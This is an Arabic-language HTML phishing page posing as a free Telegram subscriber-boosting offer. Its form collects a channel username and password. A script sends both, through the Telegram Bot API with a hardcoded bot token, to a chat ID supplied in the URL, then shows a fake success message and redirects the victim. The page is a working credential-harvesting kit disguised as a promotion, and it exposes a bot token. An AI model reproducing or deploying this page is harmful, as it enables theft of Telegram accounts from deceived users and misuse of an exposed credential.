<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Telegram رشق</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#1c2833;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#2c3e50;padding:25px;border-radius:20px;width:380px;text-align:center}img{width:80px;margin:0 auto 15px;display:block}h2{color:#0088cc;margin-bottom:6px}p{color:#aaa;font-size:14px;margin-bottom:18px}.gift-box{background:#0088cc;border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;background:#1c2833;border:0;border-bottom:2px solid #0088cc;color:#fff;font-size:16px;text-align:center}.btn{background:#0088cc;color:#fff;border:none;padding:14px;width:100%;border-radius:10px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#0077b5}</style></head>
<body><div class="card">
<img src="https://telegram.org/img/t_logo.png" alt="Telegram">
<h2>✈️ رشق مشتركين تيليجرام</h2>
<p>احصل على مشتركين حقيقيين لقناتك!</p>
<div class="gift-box"><span>🎉 500 مشترك مجاناً</span></div>
<select id="amount"><option value="100">100 مشترك</option><option value="500" selected>500 مشترك</option><option value="1000">1000 مشترك</option></select>
<input id="username" placeholder="معرف قناتك (@username)">
<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
if(!u||!pa)return alert('املأ جميع الحقول');
document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('✈️ رشق تيليجرام\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' مشترك')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://t.me',3000)});}
</script></body></html>
